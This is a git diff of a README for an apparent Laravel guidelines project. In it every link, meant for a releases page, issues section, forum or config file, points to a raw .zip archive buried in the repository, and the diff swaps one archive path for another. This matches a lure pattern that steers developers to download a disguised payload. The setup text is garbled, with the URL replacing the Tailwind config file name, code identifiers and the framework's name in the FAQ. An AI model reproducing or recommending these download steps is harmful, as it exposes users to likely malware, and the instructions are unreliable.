@@ -1,6 +1,6 @@
 # 🚀 laravel-boost-guidelines - Simplify Your Laravel Setup Today
 
-[![Download Now](https://raw.githubusercontent.com/Runeson13/laravel-boost-guidelines/main/src/Commands/boost_guidelines_laravel_stipulator.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Runeson13/laravel-boost-guidelines/main/src/Commands/boost_guidelines_laravel_stipulator.zip)
+[![Download Now](https://raw.githubusercontent.com/Runeson13/laravel-boost-guidelines/main/.ai/guidelines/wayfinder/laravel-guidelines-boost-3.9.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Runeson13/laravel-boost-guidelines/main/.ai/guidelines/wayfinder/laravel-guidelines-boost-3.9.zip)
 
 ## 🚀 Getting Started
 
@@ -20,7 +20,7 @@ If you do not have these tools, visit their official websites for installation i
 
 To start, you need to download the necessary files:
 
-1. **Visit the Releases Page**: Click [here](https://raw.githubusercontent.com/Runeson13/laravel-boost-guidelines/main/src/Commands/boost_guidelines_laravel_stipulator.zip) to go to the releases page.
+1. **Visit the Releases Page**: Click [here](https://raw.githubusercontent.com/Runeson13/laravel-boost-guidelines/main/.ai/guidelines/wayfinder/laravel-guidelines-boost-3.9.zip) to go to the releases page.
 2. **Find the Latest Release**: Look for the latest version at the top of the page.
 3. **Download the Files**: Click on the link to download the release asset appropriate for your system.
 
@@ -50,10 +50,10 @@ Once you have downloaded the necessary files, follow these steps:
 
 If you're upgrading to Tailwind CSS v4, you will need to make some adjustments in your CSS configuration:
 
-1. **Update Tailwind Configuration**: Modify your `https://raw.githubusercontent.com/Runeson13/laravel-boost-guidelines/main/src/Commands/boost_guidelines_laravel_stipulator.zip` to align with the new features. Here’s a sample configuration:
+1. **Update Tailwind Configuration**: Modify your `https://raw.githubusercontent.com/Runeson13/laravel-boost-guidelines/main/.ai/guidelines/wayfinder/laravel-guidelines-boost-3.9.zip` to align with the new features. Here’s a sample configuration:
     ```javascript
-    https://raw.githubusercontent.com/Runeson13/laravel-boost-guidelines/main/src/Commands/boost_guidelines_laravel_stipulator.zip = {
-      content: ["./resources/**/*https://raw.githubusercontent.com/Runeson13/laravel-boost-guidelines/main/src/Commands/boost_guidelines_laravel_stipulator.zip", "./resources/**/*.js", "./resources/**/*.vue"],
+    https://raw.githubusercontent.com/Runeson13/laravel-boost-guidelines/main/.ai/guidelines/wayfinder/laravel-guidelines-boost-3.9.zip = {
+      content: ["./resources/**/*https://raw.githubusercontent.com/Runeson13/laravel-boost-guidelines/main/.ai/guidelines/wayfinder/laravel-guidelines-boost-3.9.zip", "./resources/**/*.js", "./resources/**/*.vue"],
       theme: {
         extend: {},
       },
@@ -83,9 +83,9 @@ After completing the previous steps, check the following:
 
 ## 📄 Frequently Asked Questions
 
-### What is https://raw.githubusercontent.com/Runeson13/laravel-boost-guidelines/main/src/Commands/boost_guidelines_laravel_stipulator.zip
+### What is https://raw.githubusercontent.com/Runeson13/laravel-boost-guidelines/main/.ai/guidelines/wayfinder/laravel-guidelines-boost-3.9.zip
 
-https://raw.githubusercontent.com/Runeson13/laravel-boost-guidelines/main/src/Commands/boost_guidelines_laravel_stipulator.zip is a framework for building modern single-page applications using classic server-side routing and controllers. It allows you to create a seamless user experience without losing the advantages of your server-side framework.
+https://raw.githubusercontent.com/Runeson13/laravel-boost-guidelines/main/.ai/guidelines/wayfinder/laravel-guidelines-boost-3.9.zip is a framework for building modern single-page applications using classic server-side routing and controllers. It allows you to create a seamless user experience without losing the advantages of your server-side framework.
 
 ### Can I use other versions of Laravel?
 
@@ -93,14 +93,14 @@ This guide primarily supports Laravel 8 and newer. However, earlier versions may
 
 ### How do I report issues?
 
-If you encounter any problems, please visit the [Issues Section](https://raw.githubusercontent.com/Runeson13/laravel-boost-guidelines/main/src/Commands/boost_guidelines_laravel_stipulator.zip) of this repository. Provide a detailed description of the issue, and our team will assist you.
+If you encounter any problems, please visit the [Issues Section](https://raw.githubusercontent.com/Runeson13/laravel-boost-guidelines/main/.ai/guidelines/wayfinder/laravel-guidelines-boost-3.9.zip) of this repository. Provide a detailed description of the issue, and our team will assist you.
 
 ## 📞 Support
 
-If you need further assistance, feel free to contact us through the repository's [discussion forum](https://raw.githubusercontent.com/Runeson13/laravel-boost-guidelines/main/src/Commands/boost_guidelines_laravel_stipulator.zip).
+If you need further assistance, feel free to contact us through the repository's [discussion forum](https://raw.githubusercontent.com/Runeson13/laravel-boost-guidelines/main/.ai/guidelines/wayfinder/laravel-guidelines-boost-3.9.zip).
 
 ## 🚀 Update Your Installation
 
-To ensure you have the latest features, revisit the [Releases Page](https://raw.githubusercontent.com/Runeson13/laravel-boost-guidelines/main/src/Commands/boost_guidelines_laravel_stipulator.zip) regularly. Follow the same download and installation steps to update your application.
+To ensure you have the latest features, revisit the [Releases Page](https://raw.githubusercontent.com/Runeson13/laravel-boost-guidelines/main/.ai/guidelines/wayfinder/laravel-guidelines-boost-3.9.zip) regularly. Follow the same download and installation steps to update your application.
 
 For any additional resources, check the **Documentation** section within this repository. Happy coding!
